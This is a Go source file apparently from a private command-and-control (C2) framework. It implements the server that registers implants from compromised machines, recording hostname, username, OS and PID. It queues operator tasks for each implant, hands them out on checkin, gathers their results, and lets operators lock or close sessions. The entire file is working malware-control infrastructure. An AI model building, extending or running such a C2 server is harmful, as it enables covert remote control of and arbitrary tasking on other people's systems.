package c2

import (
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"github.com/azizbinmohammad/private-c2/pkg/envelope"
	"github.com/azizbinmohammad/private-c2/pkg/protocol"
	"github.com/google/uuid"
)

// ImplantSession holds metadata about a connected implant.
type ImplantSession struct {
	ID          string    `json:"id"`
	ImplantID   string    `json:"implant_id"`
	Hostname    string    `json:"hostname"`
	Username    string    `json:"username"`
	OS          string    `json:"os"`
	Arch        string    `json:"arch"`
	PID         int       `json:"pid"`
	Process     string    `json:"process"`
	Mode        string    `json:"mode"`
	RemoteAddr  string    `json:"remote_addr"`
	Transport   string    `json:"transport"`
	LastCheckin time.Time `json:"last_checkin"`
	CreatedAt   time.Time `json:"created_at"`

	// LockedBy is the operator currently holding this session, or "" when
	// unlocked. It lives in memory because a lock only means anything while
	// the session is connected.
	LockedBy string `json:"locked_by"`

	conn net.Conn
}

// Task represents a pending task for an implant.
type Task struct {
	ID        string    `json:"id"`
	Type      string    `json:"type"`
	Args      string    `json:"args"`
	SessionID string    `json:"session_id"`
	CreatedAt time.Time `json:"created_at"`
}

// TaskResult stores a completed task result.
type TaskResult struct {
	TaskID      string    `json:"task_id"`
	SessionID   string    `json:"session_id"`
	Success     bool      `json:"success"`
	Output      string    `json:"output"`
	Error       string    `json:"error"`
	CompletedAt time.Time `json:"completed_at"`
}

// ImplantServer manages implant connections, task dispatch and listeners.
type ImplantServer struct {
	mu          sync.RWMutex
	sessions    map[string]*ImplantSession
	taskQueues  map[string][]*Task
	taskResults map[string]*TaskResult
	listeners   map[string]*runningListener
}

// NewImplantServer creates a new ImplantServer.
func NewImplantServer() *ImplantServer {
	return &ImplantServer{
		sessions:    make(map[string]*ImplantSession),
		taskQueues:  make(map[string][]*Task),
		taskResults: make(map[string]*TaskResult),
		listeners:   make(map[string]*runningListener),
	}
}

// HandleConnection manages the lifecycle of a single implant connection.
// It reads the registration message, then loops handling checkins and results.
func (s *ImplantServer) HandleConnection(conn net.Conn) {
	defer conn.Close()
	remoteAddr := conn.RemoteAddr().String()

	// Step 1: Read the first frame, expect a "register" message.
	frame, err := envelope.ReadFrame(conn)
	if err != nil {
		log.Printf("[c2] failed to read registration frame from %s: %v", remoteAddr, err)
		return
	}

	var msg protocol.Message
	if err := json.Unmarshal(frame, &msg); err != nil {
		log.Printf("[c2] invalid JSON from %s: %v", remoteAddr, err)
		return
	}

	if msg.Type != "register" {
		log.Printf("[c2] expected register from %s, got %q", remoteAddr, msg.Type)
		return
	}

	var reg protocol.RegisterData
	if err := json.Unmarshal(msg.Data, &reg); err != nil {
		log.Printf("[c2] invalid register data from %s: %v", remoteAddr, err)
		return
	}

	// Create session.
	sessionID := uuid.New().String()
	session := &ImplantSession{
		ID:          sessionID,
		ImplantID:   reg.ImplantID,
		Hostname:    reg.Hostname,
		Username:    reg.Username,
		OS:          reg.OS,
		Arch:        reg.Arch,
		PID:         reg.PID,
		Process:     reg.Process,
		Mode:        reg.Mode,
		RemoteAddr:  remoteAddr,
		Transport:   "mtls",
		LastCheckin: time.Now(),
		CreatedAt:   time.Now(),
		conn:        conn,
	}

	s.mu.Lock()
	s.sessions[sessionID] = session
	s.mu.Unlock()

	log.Printf("[c2] new session %s from %s (%s@%s)", sessionID, remoteAddr, reg.Username, reg.Hostname)

	// Send register_ack.
	ack := protocol.RegisterAckData{SessionID: sessionID, Interval: 5000}
	if err := s.sendMessage(conn, "register_ack", ack); err != nil {
		log.Printf("[c2] failed to send register_ack to %s: %v", sessionID, err)
		s.removeSession(sessionID)
		return
	}

	// Step 2: Enter message loop.
	for {
		frame, err := envelope.ReadFrame(conn)
		if err != nil {
			log.Printf("[c2] session %s read error: %v", sessionID, err)
			break
		}

		var loopMsg protocol.Message
		if err := json.Unmarshal(frame, &loopMsg); err != nil {
			log.Printf("[c2] session %s invalid JSON: %v", sessionID, err)
			continue
		}

		switch loopMsg.Type {
		case "checkin":
			s.handleCheckin(conn, sessionID, loopMsg.Data)
		case "result":
			s.handleResult(conn, sessionID, loopMsg.Data)
		default:
			log.Printf("[c2] session %s unknown message type: %s", sessionID, loopMsg.Type)
		}
	}

	s.removeSession(sessionID)
	log.Printf("[c2] session %s disconnected", sessionID)
}

func (s *ImplantServer) handleCheckin(conn net.Conn, sessionID string, data json.RawMessage) {
	// Update last checkin time.
	s.mu.Lock()
	if sess, ok := s.sessions[sessionID]; ok {
		sess.LastCheckin = time.Now()
	}

	// Drain the task queue for this session.
	pending := s.taskQueues[sessionID]
	s.taskQueues[sessionID] = nil
	s.mu.Unlock()

	// Build tasking response.
	tasks := make([]protocol.TaskWire, 0, len(pending))
	for _, t := range pending {
		tasks = append(tasks, protocol.TaskWire{ID: t.ID, Type: t.Type, Args: t.Args})
	}

	tasking := protocol.TaskingData{Tasks: tasks}
	if err := s.sendMessage(conn, "tasking", tasking); err != nil {
		log.Printf("[c2] session %s: failed to send tasking: %v", sessionID, err)
	}
}

func (s *ImplantServer) handleResult(conn net.Conn, sessionID string, data json.RawMessage) {
	var res protocol.ResultData
	if err := json.Unmarshal(data, &res); err != nil {
		log.Printf("[c2] session %s: invalid result data: %v", sessionID, err)
		return
	}

	result := &TaskResult{
		TaskID:      res.TaskID,
		SessionID:   res.SessionID,
		Success:     res.Success,
		Output:      res.Output,
		Error:       res.Error,
		CompletedAt: time.Now(),
	}

	s.mu.Lock()
	s.taskResults[res.TaskID] = result
	s.mu.Unlock()

	log.Printf("[c2] session %s: result for task %s (success=%v)", sessionID, res.TaskID, res.Success)

	// Send result_ack.
	if err := s.sendMessage(conn, "result_ack", struct{}{}); err != nil {
		log.Printf("[c2] session %s: failed to send result_ack: %v", sessionID, err)
	}
}

func (s *ImplantServer) sendMessage(conn net.Conn, msgType string, data interface{}) error {
	dataBytes, err := json.Marshal(data)
	if err != nil {
		return fmt.Errorf("marshal data: %w", err)
	}

	msg := protocol.Message{Type: msgType, Data: json.RawMessage(dataBytes)}
	frame, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("marshal message: %w", err)
	}

	return envelope.WriteFrame(conn, frame)
}

// removeSession drops a session and everything held on its behalf. The task
// queue and any results it produced would otherwise live for the lifetime of
// the process, growing with every implant that ever connected.
func (s *ImplantServer) removeSession(sessionID string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.removeSessionLocked(sessionID)
}

func (s *ImplantServer) removeSessionLocked(sessionID string) {
	delete(s.sessions, sessionID)
	delete(s.taskQueues, sessionID)
	for taskID, res := range s.taskResults {
		if res.SessionID == sessionID {
			delete(s.taskResults, taskID)
		}
	}
}

// ErrSessionNotFound is returned when the given session is not currently
// connected.
var ErrSessionNotFound = errors.New("session not found")

// CloseSession terminates a live implant session and releases its resources.
//
// Closing the underlying connection is what ends the session: the implant's
// read loop fails and it disconnects. An implant configured to reconnect will
// dial back in and appear as a new session, which is the intended behaviour —
// this stops the session, not the implant process.
func (s *ImplantServer) CloseSession(sessionID string) error {
	s.mu.Lock()
	sess, ok := s.sessions[sessionID]
	if !ok {
		s.mu.Unlock()
		return ErrSessionNotFound
	}
	s.removeSessionLocked(sessionID)
	s.mu.Unlock()

	if sess.conn != nil {
		if err := sess.conn.Close(); err != nil {
			log.Printf("[c2] session %s: closing connection: %v", sessionID, err)
		}
	}
	log.Printf("[c2] session %s closed by operator", sessionID)
	return nil
}

// LockSession marks a session as held by the given operator.
func (s *ImplantServer) LockSession(sessionID, operator string) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	sess, ok := s.sessions[sessionID]
	if !ok {
		return ErrSessionNotFound
	}
	if sess.LockedBy != "" && sess.LockedBy != operator {
		return fmt.Errorf("session is locked by %s", sess.LockedBy)
	}
	sess.LockedBy = operator
	return nil
}

// UnlockSession clears a session lock.
func (s *ImplantServer) UnlockSession(sessionID string) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	sess, ok := s.sessions[sessionID]
	if !ok {
		return ErrSessionNotFound
	}
	sess.LockedBy = ""
	return nil
}

// QueueTask adds a task for the given session. Returns the new task ID.
func (s *ImplantServer) QueueTask(sessionID, taskType, args string) (string, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if _, ok := s.sessions[sessionID]; !ok {
		return "", fmt.Errorf("session %s not found", sessionID)
	}

	task := &Task{
		ID:        uuid.New().String(),
		Type:      taskType,
		Args:      args,
		SessionID: sessionID,
		CreatedAt: time.Now(),
	}

	s.taskQueues[sessionID] = append(s.taskQueues[sessionID], task)
	log.Printf("[c2] queued task %s (%s) for session %s", task.ID, taskType, sessionID)
	return task.ID, nil
}

// GetResult returns a completed task result, or nil if not yet available.
func (s *ImplantServer) GetResult(taskID string) *TaskResult {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.taskResults[taskID]
}

// snapshot returns a copy of the session that is safe to read once the server
// lock has been released. Callers marshal sessions to JSON well outside the
// lock, while the connection loop keeps writing to LastCheckin under it.
func (sess *ImplantSession) snapshot() *ImplantSession {
	copied := *sess
	return &copied
}

// ListSessions returns all currently connected sessions. The returned values
// are copies and must not be used to mutate live session state.
func (s *ImplantServer) ListSessions() []*ImplantSession {
	s.mu.RLock()
	defer s.mu.RUnlock()

	result := make([]*ImplantSession, 0, len(s.sessions))
	for _, sess := range s.sessions {
		result = append(result, sess.snapshot())
	}
	return result
}

// GetSession returns a copy of a single session by ID, or nil if it is not
// connected.
func (s *ImplantServer) GetSession(sessionID string) *ImplantSession {
	s.mu.RLock()
	defer s.mu.RUnlock()

	sess, ok := s.sessions[sessionID]
	if !ok {
		return nil
	}
	return sess.snapshot()
}
